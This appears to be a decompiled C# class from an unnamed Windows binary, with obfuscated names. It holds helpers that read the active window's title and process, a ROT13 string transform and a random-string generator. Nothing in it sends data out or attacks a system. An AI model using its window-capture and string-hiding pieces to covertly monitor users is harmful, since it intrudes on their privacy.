using System;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;

namespace uhssvc
{
	// Token: 0x02000021 RID: 33
	public class brodm
	{
		// Token: 0x060000A5 RID: 165
		[DllImport("user32.dll")]
		public static extern IntPtr GetForegroundWindow();

		// Token: 0x060000A6 RID: 166
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int GetWindowTextLength(IntPtr intptr_0);

		// Token: 0x060000A7 RID: 167
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int GetWindowText(IntPtr intptr_0, StringBuilder stringBuilder_0, int int_0);

		// Token: 0x060000A8 RID: 168
		[DllImport("user32.dll")]
		private static extern int GetWindowTextW([In] IntPtr intptr_0, [MarshalAs(UnmanagedType.LPWStr)] [Out] StringBuilder stringBuilder_0, int int_0);

		// Token: 0x060000A9 RID: 169
		[DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
		private static extern int GetWindowThreadProcessId(IntPtr intptr_0, out int int_0);

		// Token: 0x060000AA RID: 170 RVA: 0x00005EFC File Offset: 0x000040FC
		public static string Transform(string string_0)
		{
			char[] array = string_0.ToCharArray();
			for (int i = 0; i < array.Length; i++)
			{
				int num = (int)array[i];
				if (num >= 97 && num <= 122)
				{
					if (num > 109)
					{
						num -= 13;
					}
					else
					{
						num += 13;
					}
				}
				else if (num >= 65 && num <= 90)
				{
					if (num > 77)
					{
						num -= 13;
					}
					else
					{
						num += 13;
					}
				}
				array[i] = (char)num;
			}
			return new string(array);
		}

		// Token: 0x060000AB RID: 171 RVA: 0x00005F80 File Offset: 0x00004180
		public static string RandomString(int int_0)
		{
			Random rnd = new Random();
			return new string((from string_0 in Enumerable.Repeat<string>("ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", int_0)
			select string_0[rnd.Next(string_0.Length)]).ToArray<char>());
		}

		// Token: 0x060000AC RID: 172 RVA: 0x00005FC8 File Offset: 0x000041C8
		public string GetCaptionOfActiveWindow()
		{
			string result = string.Empty;
			IntPtr foregroundWindow = brodm.GetForegroundWindow();
			int num = brodm.GetWindowTextLength(foregroundWindow) + 1;
			StringBuilder stringBuilder = new StringBuilder(num);
			if (brodm.GetWindowText(foregroundWindow, stringBuilder, num) > 0)
			{
				result = stringBuilder.ToString();
			}
			return result;
		}

		// Token: 0x060000AD RID: 173 RVA: 0x0000600C File Offset: 0x0000420C
		public static bool ApplicationIsActivated()
		{
			IntPtr foregroundWindow = brodm.GetForegroundWindow();
			bool result;
			if (foregroundWindow == IntPtr.Zero)
			{
				result = false;
			}
			else
			{
				int id = Process.GetCurrentProcess().Id;
				int num;
				brodm.GetWindowThreadProcessId(foregroundWindow, out num);
				result = (num == id);
			}
			return result;
		}

		// Token: 0x060000AE RID: 174 RVA: 0x0000604C File Offset: 0x0000424C
		public static int smethod_0(int int_0, int int_1)
		{
			return int_1 << 16 | (int_0 & 65535);
		}
	}
}
